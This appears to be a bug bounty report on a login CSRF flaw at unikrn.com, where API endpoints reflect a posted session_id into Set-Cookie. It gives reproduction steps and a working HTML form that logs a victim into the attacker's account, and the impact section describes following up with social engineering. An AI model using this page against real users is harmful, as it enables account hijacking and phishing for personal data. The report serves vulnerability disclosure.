Summary:

All the API endpoints (v1 & v2) reflect session_id to Set-Cookie response - which can lead victim to login attacker account, for example:

``` 

Steps to reproduce:
=============
``` 
1. The victim has logged out the site by himself or by (out of scope) logout-CSRF. 
2. Attacker log into his account and get his session id (CW=) to craft CSRF page.
3. Lead the victim to visit CSRF page.
``` 

Sample CSRF Page
============
``` 
<!doctype html>
<html>
<head>
</head> 
<body>
<form action="https://unikrn.com/apiv1/" method="POST">
<input type="hidden" name="session_id" id="session_id" value="cm8csktf7p485hmb7on32o5bm94nm71i"> <!-- attacker session_id -->
<input type="submit"">
</form>
</body>
</html>
``` 

Note this sample CSRF assumes the user has logged out from the site, and make sure you replace attacker session_id of your current logged in account to reproduce, then goto unikrn.com after visiting the CSRF-page. However a script can be created here to automated these tasks.

## Impact

Log any victim into the attacker account, the attacker can create a similar account profile as the victim - with some information missing, and then social-engineering (e.g. email) user to provide personal information or current password.
